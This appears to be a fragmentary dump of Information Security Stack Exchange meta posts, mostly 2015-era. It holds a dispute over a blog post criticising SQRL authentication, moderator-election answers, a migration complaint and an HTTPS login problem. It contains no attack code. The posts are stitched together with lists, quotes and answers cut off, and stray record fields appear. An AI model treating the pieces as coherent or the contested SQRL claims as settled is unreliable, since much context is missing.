<li><strong>This problem is not new</strong>, I linked the Hacker Manifest in my answer which is a well known source testifying of this issue being already the same in the eighties,</li>
<li><strong>It is not opnion-based and calls for concrete, objective solutions</strong>. I took my time to write an answer as best as I could relying on my own knowledge and experience, however <em>I know</em> that this answer is not complete. For instance (and it is just an example of lack I am aware of) a lot of my reading insists on the importance of building and being involved in associations dealing with computer science, IT security and related domains. It would have been really nice for instance to get some feedback from there too.</li>
<li><strong>It concerns IT security researchers</strong>. I encountered a lot of people complaining about the wrong images in TV shows, about the wrong laws being voted, but if people from within the IT security domain do not take apart this wrong popular picture no one will do it for them.</li>
</ul>

<p>By this post here on Meta, I just wanted to ensure that this post was correctly reviewed since I edited it after it was put on hold. If the community confirms that this question should remain closed because it is not a technical request or any other cause, I would be fine with this.</p>

<p>All of the points in your question here are valid, but I do not think that they are relevant to the question as asked by the OP. Communication requires a sender and a receiver and the receiver needs to be prepared to accept communication. In the story, the receiver (the school administration) shows no interest in communication coming from the parent or pupil. This lack of interest is beyond the scope of this site. No amount of well-crafted content of a communication could fix it. </p>

<p>The first and last picture in particular show the difference there might sometimes be between things that users ask, and things that users actually need.</p>

<p>New SE users especially may ask questions in a way not suitable for SE website (it could for various reasons), while the need behind the question might match SE website activity.</p>

<p>In such situation, in order to make the question suitable for getting more answers and in order to show to the new member how the question could be rephrased in more suitable or optimal way, I find it justifiable to:</p>

<ol>
<li>Edit the post,</li>
<li>Leave a comment explaining what happened to the user (who has edited the post, why it has been edited, and how the user could revert or correct the modification if he does not agree; the fact that the user remains empowered with the question and that it is not ""stolen"" by another member may also be important to some people).</li>
</ol>

<p>We could leave 10 comments asking the user to rephrase the question himself, if he is new to the site and does not understand what is expected he may give-up and find it easier to just leave the website (add to that the fact that most probably the user is facing a real problem, hence his question, he may be too tense to step back and take the time to think on how to rephrase his question).</p>

<p>On traditional forums, the initial question may be unclear and then the discussion thread will clarify the actual need until getting the right question and the right answer. This is not how SE works and this difference may sometime be hard to grasp for new users.</p>

<li>If user's question inspires us and we want to add our own interrogations, curiosity or needs to user's question, then creating a new question linked to the original one would be the best way.</li>

<li>A series of ""beginner"" blog posts might be nice - in addition to the previous problems, we need someone to write it :-) If you are interested in writing a few of these - I'm sure that @RoryAlsop would be happy to set you up. </li>
<li>tag wikis are again a good idea, that would have little benefit even after all the effort.   </li>
</ul>

<p>Still not sure what the right solution is, but likely a combination of a few of the above: Good, solid, canonical questions with a great answer; tag wiki pointing to these (though they already have links to top questions); blog posts summarizing a set of these questions and answers; and eventually, updating the help center to point to these blog posts.<br>
The core needs to start with the canonical questions though - both since that is the most searched, and so that the incoming noob questions can be closed as dupes of them - and thus propagate it forward. </p>

<p>That.... IS a lot of work, and there are many such topics that deserve the noob attention. Many of those canonical questions have already been asked and answered - it is an issue of correlating them all, though. </p>

1874,1,2015-07-17T14:26:10.560,-1,314,"<p>Today I'd like to discuss an article that always comes up in Google when searching for SQRL. <strong><a href=""http://security.blogoverflow.com/2013/10/debunking-sqrl/"" rel=""nofollow"">Debunking SQRL on the Security Stack Exchange Blog</a></strong>.</p>

<p>I find it disheartening that an article that frankly has a lot of misleading ""facts"" is ranked high in Google, and I was hoping we could discuss about improving or removing it, so to prevent misinformation.</p>

<p>(If you don't believe me, check out the comments on that article).</p>

<hr>

<blockquote>
  <p>Passwords are convenient. They do not require users to carry around additional equipment for authentication.</p>
</blockquote>

<p>No they aren't. <em>Secure</em> passwords are anything but convenient. If your passwords aren't secure + you aren't using additional equipment for authentication (namely, multifactor authentication), then you are easily compromised and we can stop the discussion there.</p>

<blockquote>
  <p>Password authentication is easy to setup. There are countless libraries in every single programming language out there designed to assist you with the task.</p>
</blockquote>

<p>Well, of course. The specs are still being finalized and discussed. That said, there are already libraries and clients for SQRL in various languages. (<a href=""https://github.com/bushxnyc/SQRL-Server"" rel=""nofollow"">nodejs</a>, <a href=""https://github.com/trianglman/sqrl"" rel=""nofollow"">PHP</a>, <a href=""https://github.com/TheBigS/SQRL"" rel=""nofollow"">Java</a>, <a href=""https://www.grc.com/sqrl/implementations.htm"" rel=""nofollow"">various implementations and clients</a>). So again, that claim doesn't really hold.</p>

<blockquote>
  <p>Most importantly, passwords can be secure if used in the right way. In this case, the “right way” involves users using long, unique and randomly generated passwords for each application and that the application stores passwords hashed with a strong algorithm like bcrypt, scrypt or pbkdf2.</p>
</blockquote>

<p>True, on the other hand, password-based systems are very very easy to get <strong>wrong</strong>. Storing a password in plain text is a lot easier to be aware of and learn than using a strong cryptographic hash with a salt and a good cost parameter.</p>

<p>Not to mention that the <em>user</em> has the use a secure password (or be forced to, which is poor UX) for the whole system to be worth anything.</p>

<blockquote>
  <p>What Gibson describes as an advantage to his scheme I consider a huge weakness. Consider a traditional username/password authentication process. What happens when my password gets compromised? I simply request for a password reset through another (hopefully still secure) medium such as my email address. This is impossible with Gibson’s scheme. If my SQRL master key gets compromised, there is absolutely no way for the application to verify my identity through another medium. Sure, the application could associate my SQRL key with a particular email address or similar, but that would defeat one of the supposed advantages of the SQRL scheme in the first place.</p>
</blockquote>

<p>Again, wrong. There's nothing in the specs forbidding a service to provide other means of authentication in case your SQRL path is compromised. Just like Stack Exchange allows you to link multiple credential sets to your account (so that if your Google account is compromised, you can still access the site through your Facebook account, and unlink Google from your account). This is still very possible with SQRL.</p>

<blockquote>
  <p>The proposed SQRL scheme derives all application specific keys from a single master key. This essentially provides a single juicy target for attackers to go after. Remember how Mat Honan got his online life ruined due to interconnected accounts? Imagine that but with all your online identities. All your identities are belong to us.</p>
</blockquote>

<p>The example does list a smartphone as where your private is stored. But that's not in the spec. The client can be a smartphone, the user's own computer, a linux server in Sweden, or a Raspberry Pi with a client on in. Also, if you use a password manager (which you do, because if you don't, you're either a savant which, you know, good for you, or your passwords are insecure to begin with)</p>

<p>If my LastPass master key gets compromised, the same ""All your identities are belong to us"" crisis is to be expected.</p>

<blockquote>
  <p>People also have the tendency to misplace their smartphones. When combined with the previous point of no other means to identify yourself to the application, this would be a very good way of locking yourself out of your “house”</p>
</blockquote>

<p>Well, when people start realizing that their phones hold a lot of information about them, information they don't want to ""misplace"" or have fallen into the wrong hand, they'll keep better care of it. Also, SQRL does give you the ability to backup your key for a rainy day.</p>

<blockquote>
  <p>So, for example, a phishing site can display an authentic login QR code which logs in the attacker instead of the user. Gibson is confident that users will see the name of the bank or store or site on the phone app during authentication and will therefore exercise sufficient vigilance to thwart attacks. History suggests this unlikely, and the more reasonable expectation is that seeing the correct name on the app will falsely reassure the user into thinking that the site is legitimate because it was able to trigger the familiar login request on the phone.</p>
</blockquote>

<p>I read this, and I ask myself if the writer has read the SQRL spec (or even just the example)</p>

<p>If falsebank.com provides me with a login QR code taken directly from bank.com, my client will send a login request to bank.com, not to falsebank.com. If falsebank.com shows me a QR code for falsebank.com, they learns nothing about my relationship with bank.com, so I really don't understand the point being made here.</p>

<hr>

<p>I apologize if I hurt anyone, but that article is one big misinformation. That's not to say that there aren't flaws with SQRL (namely, if you lose your private and haven't backed it up. This weakness also applies to master keys found with password managers, so we haven't made the situation any worse).</p>

<p>I want to ask we remove that article, because it</p>

<li>reduces the site's reputation with actual experts.</li>

1877,2,2015-07-18T04:57:52.380,7,,"<p>As for the convenience and other factors about passwords or SQRL, I don't find either system particularly compelling. But for phishing, this is something that I find to be a very serious issue.</p>

<p>I'll spare you all the technical details, but the basic issue is that SQRL is strictly out-of-band. Your identity is your phone, your phone cannot communicate with your browser. The <em>website</em> can communicate with your browser, and the <em>website</em> can communicate with your phone (both directly and by sending QR codes), but the browser never gets to deliver the phone the browser's verdict about the TLS session. So the security of the user's TLS session doesn't factor into the authentication step, and therefore authentication can be subverted. In other words, phishing can and will happen.</p>

<p>SQRL is fine for situations where authentication isn't important -- situations where it doesn't matter if your account gets compromised. Situations where you'd be happy using the word ""passw0rd"" as your password. But if security matters, then SQRL is not for you.</p>

<p>If you want to see an example of authentication done <em>right</em>, then look at the U2F security key created by Google. Remember that bit about browser integration? For U2F, the browser (this is built in to chrome) communicates directly with the USB hardware and tells the USB token what website it's on after verifying the website identity through TLS. That becomes part of the key exchange, meaning that it is literally impossible to authenticate on a phishing page. This means that phishing isn't just ""hard"" or ""unlikely"" or ""complicated"" -- phishing is <em>impossible</em>. </p>

<p>Gibson <em>almost</em> got this right, but he made a typical amateur error in failing to understand the attack model. He makes the website identity part of user identity, but the website doesn't need to be authenticated to the browser. So a phisher can take a <em>valid</em> QR code from the real site and show it to a victim using an <em>invalid</em> phishing page. The victim authenticates, and the attacker gets logged in. I'm sure Gibson could have gotten it right if he had more experience in designing security protocols. But as these go, the error is too deeply baked into the protocol, and it can't be salvaged.</p>

<p>I believe we still have some uncertainty around what questions are appropriate for the site, and this results in some questions being closely incorrectly or at least too quickly.  Specifically when questions move out of the realm of the theoretical and into the practical, we have an unfortunate tendency to close with prejudice.  As to remediation, I think this is exactly what meta is for, and we as a community and as a moderation team should be leaning on this tool more than we currently do in order to provide additional guidance.  </p>

</blockquote>

<p>To some extent HackOverflow overlaps with this site, and to some extent it overlaps with ReverseEngineering.SE. I think there's a legitimate place for ReverseEngineering.SE, but for the HackOverflow questions that don't fit there, I think that speaks more to our neglect of some of the practical questions I mentioned earlier than to a need for a new site.  </p>

<p>First, I would confer with the rest of the moderation team.  My initial desire would be to ping the user to offer corrective guidance, but I would want to make sure that the mod team was on the same page before speaking on behalf of the site.  </p>

<p>No, not on StackExchange or an IT Security site.  I do have 15 years professional experience building communities (both the software and the communities that use the software) and working with community managers and management teams. </p>

<blockquote>
  <p>Some have complained that people make close votes too easily. Do you

<p>I try to be careful about closing questions, personally, and vote to leave a fair number open.  As I've mentioned in several previous answers, I think more extensive use of our meta site could allow us to offer better guidance to the community on when questions we're currently closing might actually be valuable to the site. </p>

<p>I'm not particularly familiar with chat moderation, and I'm not active in that room, so I would probably just put the room in timeout for a minute (I think mods can do that) to allow the mods who know the room and the users to show up and provide more specifically appropriate guidance. </p>

<p>Well, we know which users have particularly good answers on a particular topic.  In some cases it may be as simple as doing a little legwork to reach out to the them, to get them to add canonical answers.   In other cases, it may be a good idea to spend the time to aggregate the answers from several different duplicate questions into a community wiki answer on the best question in the vein.  In most cases including those about, the answer is that somebody, either a moderator or community member needs to commit to spend the time and energy required to drive the issue to resolution, and time and energy are often the shortest assets in supply in a part-time volunteer community.  It might be helpful to be able to flag questions as needing a canonical answer and surface that in a visible and easy to access location, so it can be regularly reviewed and someone could knock one out when the mood strikes.   </p>

</blockquote>

<p>To my opinion, the biggest challenge would be consolidation of our knowledge. There are now a lot of questions, lot of good ones with as good answers. I think effort should be made to improve the searchability of these questions. Most notably, bring back some kind of FAQ like we used to have, where we gather the most common questions (maybe a different format). Then a lot of tags need cleaning, because they yield improper results, or some questions are missing tags.</p>

<p>The second main thing would be providing better guidance to newcomers. Lot of questions got closed, usually with good reasons, but users are left without any comments. Most of the closed questions (even duplicates sometimes) are opportunities to make better questions, new users are not usually motivated to do it when they see their question downvoted and closed fast.</p>

<p>As a matter of fact, I would be happy to work and help on other projects/propositions the community (or even current moderators) would want to. </p>

</blockquote>

<p>I don’t think of area51 as any threat nor a lack of our community. If our scope was to evolve, it’s up to the community here. We have done it in the past. And if the proposals finds their way into private or even public beta, well good for them. The procedure of growing and graduating are working really well. If these proposals comes as new fully fledged site, it would be because they have their own community and a good scope as well. And topic overlap has been a fact for many already existing stacks, which are still very healthy. Users define their communities.</p>

<blockquote>
  <p>How would you deal with a user who produced a steady stream of valuable answers, but tends to generate a large number of arguments/flags from comments?</p>
</blockquote>

<p>Well, the usual trick question of the user that provide good and bad thing to the community. We do want to keep them of course, so if they are also producing bad results this is when moderation is needed. Most of the time, theses cases shall be solved with a discussion with the user. If they already contribute to the community by generating quality content, they would surely be open to improve themselves. If the problem still persists despite all attempts and they have an overall negative contribution, we need to be firm about the bad things and act accordingly.</p>

<blockquote>
  <p>How would you handle a situation where another mod closed/deleted/etc a question that you feel shouldn't have been?</p>
</blockquote>

<p>Well, first I find that our moderators rarely act out of haste here. So the question would probably be closed first. And that case is still eligible for a reopen vote by the community. Bringing a bit of highlight on the question, for example in the chat room, would be the first thing to do. Rory also regularly asks for community review on these questions he thinks has not been given enough credit to and can be improved/reopened. As I said above, closed questions can be opportunities to improve.</p>

<p>Should it happen that the question/answer gets deleted while I don’t agree, well we do have chat rooms (and there are rumours of hidden moderators chat rooms, where they all share these dark secrets). Maybe I will agree to their point, or they will agree to mine. If it's still a point a conflict between mods, a meta post might be appropriate to let the community decide what they think is best.</p>

<blockquote>
  <p>Do you have prior experience as a moderator, either on Stack Exchange or on an IT Security site?</p>

<p>I had the opportunity to use some of the moderators tools while I was on the private beta of <a href=""https://french.stackexchange.com/"">French Language and Usage</a> back in the days. I also had the opportunity to moderate some community like university forum, private forums. I also do moderate a non-profit organisation forum along with our team.</p>

</blockquote>

<p>I did not take a close look to it. But if it’s a point people really complain about, it’s worth exploring. Nothing is set in stone. I can’t tell for sure I would do more, until I know what’s really the problem and the consequences. If I had to guess, what could be done, I am pretty sure that bringing awareness or guiding people (like with a meta post) would be the way to go. After, all closing questions is the right of the community. They can be closed, but they also can be reopened. The self moderation is a keystone of any stacks and it’s not good to impose rules on it. However, warning the community to be cautious and relevant in their votes, reminding them of its role is perfectly fine to me. And again, closed questions are opportunities to improve. </p>

<p>First thing first: these rooms have dedicated moderators who probably know better than me what is going on. So the thing to do would be to get in touch with them asap. If it becomes obvious they are not here to deal with the situation, I see no problem in stepping in to deal with it myself. Most of the conflict should disappear by asking nicely to behave. If this is not enough, moderators tools are here for these other cases. </p>

</blockquote>

<p>As I said on a previous answer, there is indeed a work to do for these “most common” questions. I don’t have the exact format in mind yet, but the first thing that comes to my mind would be a meta post to reference them. There has been some example of FAQs on some stacks meta that have work correctly. 
Another idea would be to start project. We had our blog, for which many provided real good articles, but it’s not been updated since 2014. Maybe having community project could gather our authors to work on this goal and help in having question compiled together to form the canonical posts we are lacking.</p>

<blockquote>

How do you respond?

</blockquote>

<p>To start, any author can delete his own question or answer. Even anonymous ones in the right conditions. This leave the question only visible to 10k+ users, meaning 29 persons and 2 bears. So I would say this would rather limit the damage in the first place. Should the user really be incapable of deleting said question, it’s a bit trickier. First, we have no way to be sure the content belongs to the entity. Second, we might not even be able to confirm the identity of the user asking us. So unless it’s seems pretty evident that some law has been broken (like if someone publishes personal information, or credit card number), I would leave that way. In all the case, I think it is wise to refer to higher authority. I am pretty confident that StackExchange has a legal advisers on board that could be contacted by the moderator team for these kind of cases and I think they would prefer to be notified of potential problems that might not be, rather to find a complain at their door.
A good tool to have would be to be able to edit without history, this could be used to “anonymise” the data properly, but I don’t think such tool exists at this time. And maybe our current moderators know of a good way to proceed already.</p>

<p>Thanks for reading me.</p>

<p>Good luck to all candidates. </p>

<p>I think the main problem with the site is the relative lack of <em>quality</em> questions and answers.

<p>I believe that all of these proposals are strict subsets of Information Security Stack Exchange (and in some cases Stack Overflow).

<p>I believe that the site moderators or moderators that hang out in the room should deal with the situation if possible since different rooms have different cultures and different things they consider acceptable.

</blockquote>

<p>The biggest challenge that Sec.SE is facing right now, from my perspective, is an interpretation of focus and intent especially as the community evolves. Is Sec.SE intended primarily for InfoSec professionals to seek answers or for InfoSec professionals to answer questions? This is not an easy problem. I'm seeing a definite trend where many of the core InfoSec questions have already been answered sufficiently, and if we are too strict in the ""professional nature"" of the questions, we will severely hamper the community. On the other hand, if we allow all natures of questions, then we dilute the existing valuable professional nature of the site.</p>

<p>This is a problem that needs to be addressed by the community as a whole, led by the moderators. It would be interesting to run polls of the community to ask about new on-topic material. </p>

</blockquote>

<p>This is a fantastic question and relevant to my previous answer. My stance all along has been that Sec.SE should remain on the conceptual and architectural levels. As a rule of thumb (certainly not strictly), a question that would have an answer that would be a command or a configuration option is more of a tech support or a tool-specific question. If we allowed all these types of questions, we would be (we have been at times) inundated with questions of so specific nature that the overall intent of the site could be/would be lost. To that end, a Stack Exchange site that could tackle these important questions should exist: a site where it would make sense to debate and discuss the relevant merits of various nmap options or technical troubles with metasploit. </p>

<p>In my opinion, Sec.SE should seriously consider the merits of taking on the higher level topics, such as Privacy. But, even such a move should be done with a clear understanding of the scope of the topic. </p>

<p>I do not see the spawning of these sites as a lack on Sec.SE's part, but an indication of the ever-evolving needs of the broader community, an evolution that Sec.SE can guide and respond to. </p>

<blockquote>
  <p>How would you deal with a user who produced a steady stream of

</blockquote>

<p>The fact that the user produces valuable answers means that it is a user that the site should encourage to stay involved. An unfortunate trend in unhelpful comments needs to be addressed on a personal level. I would reach out personally in order to understand the motivation for the unhelpful comments and to inform the user how those comments are affecting the community. I would also alert the other mods in order for us to come up with consistent and communal approach in dealing with the comments that are causing problems.</p>

<blockquote>
  <p>How would you handle a situation where another mod closed/deleted/etc
  a question that you feel shouldn't have been?</p>
</blockquote>

<p>I would simply seek to understand. It is important that all mods act in concert, and if there is a disconnect, or a desired shift in the previous understanding, then starting a discussion is the best way for everyone, including me, to work together. The Meta site and the DMZ are great ways to do this.</p>

<blockquote>

<p>I do not have experience as a moderator on other sites, but I do have experience as Speaker of the House in Parliamentary debate clubs, as a Game Master in a variety of tabletop RPG games, and as a school department head and a business owner and manager. </p>

<blockquote>
  <p>Some have complained that people make close votes too easily. Do you
  intend to do anything about that?</p>
</blockquote>

<p>The site must be clear about what is on topic and what constitutes a question that is too poor to answer. Quick close votes should reflect that a question clearly does not meet the established standards. If quick close votes are not reflecting that, then I would make a broad call to the community for mindfulness from everybody when casting close votes, and perhaps re-open closed questions that might require a reevaluation from the community. In addition, it might be helpful to add to the FAQ to communicate guidelines that would address the specific concerns.</p>

<p>Dropping into the middle of an established community and in the middle of a conversation to try to exert control can only make problems worse.

That way, if there was a problem, people would have access to a moderator, but I hopefully wouldn't cause a new problem by my presence.</p>

<p>This is an important question to me. The problem that I'm seeing is a lack of a clear subject matter expert within the community for these questions. The community should work together to pull in the resources it needs to come up with a canonical reference. This way, these obviously important questions for people can be handled in a way that is helpful for everyone.</p>

<blockquote>
  <p>A question is flagged: Please delete this question – my boss has seen
  it and says it contains confidential code – he's freaking out and
  wants me to remove it, but I can't delete it. The question was asked 3
  days before, it has 2 answers, one is accepted. How do you respond? I
  could imagine this might be particularly pertinent on this Stack,

  passwords hints/policies, crypto details) and land themselves in hot

</blockquote>

<p>Despite the public nature of the site (and the reputation points for the accepted answer), the people posting retain responsibility for their content. If a user posts sensitive content, then the mods should support the user's request for removal. If this question is asking about a 3rd party asking for someone else's question to be removed, then I would reach out the user that posted the material to either work with the user to substitute the sensitive material or to seek approval to remove the question. If a conflict remains, then the 3rd party might need to prove that the material is under their control and the mods would have to work together to come up with a solution.</p>

  <p>Do you have any pre-existing conflicts or points of tension with community managers or other moderators? This question draws rationale from this Meta Server Fault thread: <a href=""https://meta.serverfault.com/questions/8054/abrupt-change-in-moderation-staff"">Abrupt change in moderation staff</a></p>
</blockquote>

<p>Community managers have a tough job ahead of them. The vast variety of personalities, motivations, and preconceptions they have to somehow mold into a cohesive happy unit sounds pretty dang daunting to me. To my mind they're here to support us so anything I can do to not make it harder is the only right choice. I definitely respect the work they do and have even developed a friendship with some of them in the past. Beyond the community team, through my long term involvement both here and at ServerFault, I have come to know a large group of moderators and StackExchange employees. All of whom I respect as people or colleagues and would enjoy working with.</p>

<p>The specific thread mentioned is an interesting one. A simple text search will show my name in there a few times. My concern from the beginning was entirely based in the communication and a desire to see that the investigation was handled well. While I still believe the public communication was somewhat less than ideal I feel pretty comfortable in how the investigation went down. Both Shog's final analysis and comments from technical staff lead me to believe the cleanup, at least, was handled with the kind of care a former forensics kid would appreciate.</p>

  <p>What do you think Sec.SE's biggest challenge is? (E.g. question/answer quality/quantity, too many/few closures, too many/few questions of a certain type, bad tools/guidance, …) What do you think should be done about this (whether as a moderator, or by other users, or by Stack Exchange staff or anyone relevant)?</p>
</blockquote>

<p>Personally I've found the biggest challenge is lack of question interest. It's been quite some time since I've seen a question that I <em>want</em> to spend the time answering. As far as the site itself I believe the content as a whole is certainly up to snuff. What I think we could use is some organization and general editing. We currently have on the order of 23k questions and 47k answers. That's...a lot. It's time we did another tag audit and cleaned them up. Then just generally going through and editing posts for clarity and readability. Neither of those tasks necessarily require moderator privileges but the work can be made easier with them, tagging particularly.</p>

  <p>There are several proposals for new Stack Exchange sites that would overlap to a debatable extent with this one, in particular: <a href=""https://area51.stackexchange.com/proposals/86353/hackoverflow"">HackOverflow</a>, <a href=""https://area51.stackexchange.com/proposals/85293/hackexchange"">HackExchange</a> (clearly a duplicate of HackOverflow), and in a different vein <a href=""https://area51.stackexchange.com/proposals/80776/privacy"">Privacy</a>. What do you think of these proposals? Do they reflect different topics that merely overlap? Does their existence betray a lack from Sec.SE's part?</p>
</blockquote>

<p>Based on the sample questions and description I see nothing in HackOverflow that is not already explicitly on-topic here. Gilles did an excellent job of diving into the root of the matter and pointing out the Great Hat Color War. The HackOverflow and HackExchange proposals are as far as I'm concerned an unfortunate consequence of the overloaded use of the word ""hack"" and a misunderstanding of the difference between on-topic and bad or not suitable for the SE format.</p>

<p>Privacy is much more interesting. It's definitely true that many Information Security folk get deeply into privacy issues as a hobby but is one a super-set of the other? The proposed questions are a mishmash of topicality. Some of them are definitely on-topic on Sec.SE, others...I'm not so sure. Let's look at our mission statement.</p>

<hr>

<p>IT Security Stack Exchange is for Information Security professionals to discuss protecting assets from threats and vulnerabilities. Topics include, but are not limited to:</p>

<ul>
<li>web app hardening</li>
<li>network security</li>
<li>social engineering, including phishing</li>
<li>risk management</li>
<li>policies</li>
<li>penetration testing</li>
<li>security tools</li>
<li>using cryptography</li>
<li>incident response </li>
<li>physically securing the office, datacentre, information assets etc.</li>
</ul>

<hr>

<p>While many companies do have privacy policies as part of their Information Security or Compliance programs there's not much else in the list that looks immediately applicable to me. I would love to hear someone argue for Privacy being a subset, it would be a great discussion. This means the real question is <em>should</em> Privacy be covered under Security.SE. I'll have to think on that some more and let the idea stew. I would say likely no but it's something we should have more discussions about as a community and give the collective a chance to weigh in.</p>

<blockquote>
  <p>How would you deal with a user who produced a steady stream of valuable answers, but tends to generate a large number of arguments/flags from comments?</p>
</blockquote>

<p>This is a particular challenge. We definitely want to reward and encourage useful content but if it results in generating a toxic atmosphere? That's not good. The first step should always be an adult conversation with the person in question. Let them know that a segment of the population, significant enough to make the conversation happen, has some concerns and to keep them in mind. It's been my experience that most people, even on the Internet, are reasonable and are willing to be at least put forth some effort to not be a raving jerk. If the conversation, and accompanying corrective nudges, aren't effective then we have to start looking at cooling off periods. I hate the idea of forcibly ejecting users who are actually valuable but we also can't allow someone freedom to disenfranchise or drive off others simply because they're useful.</p>

<blockquote>
  <p>How would you handle a situation where another mod closed/deleted/etc a question that you feel shouldn't have been?</p>
</blockquote>

<p>Much like above this is where the adult conversation happens. Preferably behind closed doors. I have had long experience with the moderation team here and trust them all. If, after hearing their reasons, I still wasn't convinced then I would ask another member of the mod team for their opinion. I like to think that I'm generally open to other people's ideas and would go with the consensus at that point. While I would prefer to agree with a decision I'm not against going along with the majority so long as I feel that it's been reached reasonably and dissent was allowed to be heard.</p>

<blockquote>
  <p>Do you have prior experience as a moderator, either on Stack Exchange or on an IT Security site?</p>
</blockquote>

<p>I have been involved in this community since the very beginning. I've been a part of building the culture that we love so much and helping shape it through the user-level moderation tasks. I have not, however, formally operated in an official moderator position.</p>

<blockquote>
  <p>Some <a href=""https://security.meta.stackexchange.com/questions/1807/can-people-please-be-a-little-less-zealous-with-close-votes"">have complained</a> that people make close votes too easily. Do you intend to do anything about that?</p>
</blockquote>

<p>When it comes to close votes a moderator is in a funny spot. We can't exactly do anything about zealous closing. In fact we can only make the situation worse! Our best option would be to keep an eye on questions that go through the close vote queue and re-open any that maybe should have stayed open. Other than that it's pure horse trading by trying to encourage the community to slow down before voting.</p>

<blockquote>
  <p>As a moderator on Information Security you will also become a moderator on all of chat.stackexchange.com - which has rooms for most sites (all except Stack Overflow and Meta.StackExchange). A heated discussion is flagged in ""The Suspension"" chat room which is associated with BridgeBuilding.stackexchange.com - there is swearing and name calling. What do you do?</p>
</blockquote>

<p>I've been pretty vocal about this issue since the beginning. As a long time participant and contributor to ServerFault I would frequently see swarms of mods swoop into the chat room and start throwing around calmbalms like a rapper at a rave. The culture of each site's chat rooms are just as unique as the site itself. What seems offensive to one group may not be to another. As such I would try to do the same thing I do now when processing chat flags; err on the side of neutral. If I felt compelled to oversee I would at least start with saying that I came in because of a boatload of flags and ask if there's a problem. Let the community let me know what they find acceptable instead of me trying to force my own notions on them.</p>

<blockquote>
  <p>One challenge that Sec.SE experiences is that of repetitive questions for which there could be a canonical answer, but for which there often is no single canonical answer posted.  <strong>Can you suggest a way for us to improve canonical reference handling of FAQs?</strong> The primary example might be new users posting obfuscated PHP code that they found in their Wordpress - there are a handful of good answers in the past, all narrowly focused on the code presented within the question that they answered, but rarely describing the principles and tools of de-obfuscation that would make for a useful canonical answer.  New questions rarely receive solid canonical efforts because posters know that there are already many answers out there; old excellent answers get lost in the shuffle among so many of the same type of questions. People are going to keep coming with this question, and others like it - we can't pre-educate newcomers all that well.  How can we handle it to both meet their needs and lower the repetitive investment of ""good enough here and now"" answers?</p>
</blockquote>

<p>This is a hard one. We presuppose that the problem can't be solved at the source so instead we must handle it on the back-end. I believe we're going to have to take a multipronged approach. Firstly, it means closing questions quickly, before they have a chance to collect answers. Secondly, making sure that close questions all get closed to a single canonical question so that it will trickle up in the FAQ section. Thirdly, and perhaps most importantly, make sure that canonical question is awesome so that it has all the right SEO magic. Google is our best friend here. If the asker finds their answer first then everybody wins.</p>

<p>If the original poster asks to have their own content deleted then I would feel pretty justified in doing so.

<p>That question was migrated from security.stachexchange.com to serverfault.com and I very strongly disagree with that.</p>

<p>The CMS / PKCS7 was generated with my own custom code. Not OpenSSL and not any third party library but my own custom written code. So given that it seems likely that the issue is structural. ie. having to do with ASN1 / DER and what is <em>anyone</em> at serverfault.com going to know about ASN1 / DER? That's a format used almost exclusively with cryptography. I'm split between security.stackexchange.com or crypto.stackexchange.com being the best place for ASN1 / DER questions but serverfault.com? That's not even remotely the appropriate place.</p>

<p>Heck - even stackoverflow.com would be more appropriate than serverfault.com.</p>

<p>I mean, seriously, so long as it's over there, people are going to ask how I generated it. With proprietary code that I'm not willing to share. That's how I generated it. I'm not asking for help how to generate them using existant tools. What I'm looking for is someone to look at the ASN1 / DER structure and, utilizing their knowledge of the PKCS7 / CMS RFC's to say why it's not finding the cert. serverfault.com is not the place to find answers like that.</p>

<p>Asking for how the signed message was generated is about as relevant as asking about how a CSV was generated when Microsoft Excel isn't able to load the CSV. In that scenario a more appropriate response would be to look at the CSV and, utilizing your knowledge of the CSV format (if you're attempting to answer the question) say what is wrong about it. Same thing with this. If you know anything about PKCS7 / CMS / ASN1 / DER then you can utilize that knowledge to maybe answer the question if you're so inclined.</p>

It also seems like I lost three up-votes due to this migration. </p>

That's why answers get constantly re-ordered by votes, that's why comments have limited formatting and length and only a few display, and so forth.

<p>Due to a wrong Common Name being used for the Meta website certificate, the first connection is a bit funky: requires to disable the plugin, manually trust the certificate, then re-enable the plugin. Afterwards, the Meta is accessed through HTTPS flawlessly.</p>

<p>At least it was so until the recent StackExchange major updates bringing us the new profile etc. During about a week, I began to have CloudFlare error pages telling me the back-end certificate was wrong, but refreshing the page one or two times was sufficient to access the Meta website anyway. A bit dirty, but working.</p>

<p>Now, since a week (so it is not a temporary issue), when trying to access the Meta website through HTTPS my request is systematically rejected by a ""403 Forbidden"" raised by ""cloudflare-nginx"".</p>

<p><strong>Well, the issue is even a bit worse than I thought :(</strong></p>

<p><em>I guess the better option is to abandon HTTPS altogether on Security SE...</em></p>

<p>When logging-in from the HTTPS version of Security SE, the StackExchange session cookies are created with the <code>secure</code> flag enabled, so are incompatible with the HTTP version of Meta.</p>

<p>But what is worse is that it becomes impossible to login on the Meta website, since the login page being in HTTPS detects that we are already logged-in but does not remove the <code>secure</code> flag from the already created cookies, in other words the ""log in"" link does not work any more.</p>

<p>So it becomes mandatory to log-off from the HTTPS version of Security SE, and login back again on the HTTP version to be able to access Meta.</p>

  <p>The analog hole (also known as the analog loophole) is a fundamental
  and inevitable vulnerability in copy protection schemes for
  noninteractive works in digital formats which can be exploited to
  duplicate copy-protected works that are ultimately reproduced using
  analog means. Once digital information is converted to a
  human-perceptible (analog) form, it is a relatively simple matter to
  digitally recapture that analog reproduction in an unrestricted form,
  thereby fundamentally circumventing any and all restrictions placed on
  copyrighted digitally distributed work. Media publishers who use
  digital rights management (DRM), to restrict how a work can be used,
  perceive the necessity to make it visible and/or audible as a ""hole""
  in the control that DRM otherwise affords them.</p>

<p>The main problem behind is that there are very different people around here, practically we could talk about two different ""population"":</p>

<ol>
<li>People from an experimental viewpoint. They tend to have smaller reputation, asking practical questions, mostly they aren't security specialists, but have an  above average affinity to the security.</li>
<li>People from a professional or theoretical affinity. They tend to have higher reputation, see the world from a more theoretical viewpoint, and they are either in the academical sphere or they are specialized into security.</li>
</ol>

<p>These groups see the world from a partially incompatible perspective:</p>

<ul>
<li>Many of the questions of Group1 are bikesched questions for Group2. Bikesched question means the questions resulting long comment-chat with few really new information, with the unsaid goal from the parttakers to vote eachother up.</li>
<li>Content of Group2 is often irrelevant / ununderstable for Group1.</li>

<p>There is another effect, the SE sites as they mature tend more closed and narrow their topics. It is not an SE problem, every community on the net behaves on this way since first irc channels. There is no real fix for that, but mods/admins knowing this and actively working against the phenomenon can delay this by years.</p>

<p>What can help:</p>

<ol>
<li>Decode the said and unsaid wishes of others, it often helps a lot.</li>
<li>Don't give it up. If you got some negative backslash, decode the reason, change your attitude and formulation, and restart.</li>

<p>The use-case is as follow:</p>

<ul>
<li>There are several close reviews pending,</li>
